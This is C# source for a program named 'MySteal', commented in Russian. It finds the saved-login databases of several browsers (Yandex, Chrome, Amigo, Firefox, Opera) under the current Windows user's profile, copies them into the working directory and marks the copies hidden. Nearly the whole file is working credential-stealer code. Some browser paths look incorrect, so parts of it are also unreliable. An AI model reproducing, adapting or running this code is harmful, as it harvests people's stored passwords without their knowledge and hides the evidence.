using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace MySteal
{
    class Program
    {
        static void Main(string[] args)
        {
            Dictionary<string, string> ListBrowsers = new Dictionary<string, string>(); // Коллекция путей к браузерам
            string UserNamePC = Environment.UserName;           // Получение имени (профиля/пользователя) компьютера
            string NamePC = Environment.MachineName;            // Получение имени компьютера
            ListBrowsers.Add("Yandex", Path.GetFullPath($@"C:\Users\{UserNamePC}\AppData\Local\Yandex\YandexBrowser\User Data\Default\Login Data"));   // Добавление пути Яндекс Браузера
            ListBrowsers.Add("Google", Path.GetFullPath($@"C:\Users\{UserNamePC}\AppData\Local\Google\Chrome\User Data\Default\Login Data"));          // Добавление пути Гугл Хрома Браузера
            ListBrowsers.Add("Amigo", Path.GetFullPath($@"C:\Users\{UserNamePC}\AppData\Local\Amigo\User Data\Default\Login Data"));                  // Добавление пути Амиго Бразуера 
            ListBrowsers.Add("Mozila", Path.GetFullPath($@"C:\Users\{UserNamePC}\AppData\Local\Mozilla\Firefox\Profiles\Login Data"));                 // Добавление пути Мозила Бразуера 
            ListBrowsers.Add("Opera", Path.GetFullPath($@"C:\Users\{UserNamePC}\AppData\Opera Software\Opera Stable\Login Data"));                    // Добавление пути Опера Бразуера 

            foreach (var path in ListBrowsers)                  // цикл перебора путей браузеров
            {
                if (File.Exists(path.Value))                          // если файл существует
                        File.Copy(path.Value, $@"{Directory.GetCurrentDirectory()}\{UserNamePC} {path.Key}_LoginData", true);                            // копирование файлов в текущую директорию
            }

            for (int i = 0; i < ListBrowsers.Count; i++)
            {
                try
                {
                    foreach (var path in ListBrowsers)                  // цикл перебора путей браузеров
                    {
                        FileAttributes attributes = File.GetAttributes($@"{Directory.GetCurrentDirectory()}\{UserNamePC} {path.Key}_LoginData");   // получение аттрибутов нашего файла
                        if (attributes != FileAttributes.Hidden)
                            File.SetAttributes($@"{Directory.GetCurrentDirectory()}\{UserNamePC} {path.Key}_LoginData", FileAttributes.Hidden);    // делаем файл скрытым
                    }
                }
                catch (Exception)
                {
                    continue;
                }
            }
        }
    }
}